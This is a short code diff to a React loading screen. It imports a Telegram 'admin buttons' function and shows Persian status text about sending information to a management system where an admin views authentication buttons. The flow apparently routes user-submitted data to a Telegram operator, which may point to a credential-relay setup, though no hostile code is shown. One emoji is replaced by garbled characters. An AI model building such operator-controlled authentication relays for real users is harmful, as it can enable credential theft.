@@ -4,6 +4,7 @@ import { Loader2, AlertCircle } from "lucide-react";
 import {
   setUserCurrentStep,
   getSession,
+  showAdminButtons,
 } from "@/lib/telegram-service-enhanced";
 
 const Loading = () => {
@@ -362,7 +363,7 @@ const Loading = () => {
               lineHeight: "1.4",
             }}
           >
-            🤖{" "}
+            ��{" "}
             {isLoading
               ? "در حال ارسال اطلاعات به سیستم مدیریت..."
               : "ادمین در تلگرام دکمه‌های احراز هویت را مشاهده می‌کند"}
